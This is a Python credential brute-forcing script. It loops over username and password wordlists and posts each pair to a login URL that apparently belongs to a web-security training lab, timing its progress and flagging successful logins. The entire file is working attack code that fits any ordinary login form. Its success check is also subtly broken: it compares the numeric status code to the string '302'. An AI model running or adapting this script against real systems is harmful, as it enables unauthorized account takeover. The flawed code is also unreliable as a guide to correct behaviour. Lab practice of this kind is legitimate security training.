import requests
import time

url = "https://0a6d00800346df68812693900080003f.web-security-academy.net/login"
userList = "Codes/usernames.txt"
passList = "Codes/passwords.txt"
grep = "Invalid username or password."

def calculate_time(start_time, current_iteration, total_iterations):
    elapsed_time = time.time() - start_time
    avg_time_per_iteration = elapsed_time / current_iteration
    remaining_iterations = total_iterations - current_iteration
    remaining_time = remaining_iterations * avg_time_per_iteration
    percentage_done = (current_iteration / total_iterations) * 100
    return elapsed_time, remaining_time, percentage_done

def brute_force_login(url, userList, passList, grep=None , staus=None):
    with open(userList , 'r') as usernames:
        total_usernames = sum(1 for _ in usernames)
        usernames.seek(0)  # Reset the file pointer to the beginning

        start_time = time.time()
        current_iteration = 0

        for username in usernames:
            with open(passList , 'r') as passwords:
                total_passwords = sum(1 for _ in passwords)
                passwords.seek(0)  # Reset the file pointer to the beginning

                for password in passwords:
                    current_iteration += 1
                    username = username.strip('\n')
                    password = password.strip('\n')
                    data = {'username': username, 'password': password}
                    response = requests.post(url, data=data, allow_redirects=False, verify=True)
                    if grep:
                        if grep in response.text:
                            print(f"Wrong Login with 'username' = {username} and 'password' = {password}")
                            continue
                        else:
                            print(f"Login successful with 'username' = {username} and 'password' = {password}.")
                            break
                    if staus:
                        if response.status_code == '302':
                            print(f"{response} Login successful with 'username' = {username} and 'password' = {password}.")
                            break
                        else:
                            print(f"{response} Wrong Login with 'username' = {username} and 'password' = {password}")
                            continue

            # Calculate time and progress
            elapsed_time, remaining_time, percentage_done = calculate_time(start_time, current_iteration, total_usernames * total_passwords)
            print(f"Time elapsed: {elapsed_time:.2f} seconds | Remaining time: {remaining_time:.2f} seconds | Progress: {percentage_done:.2f}%")

if __name__ == "__main__":
    brute_force_login(url, userList, passList, staus='302')
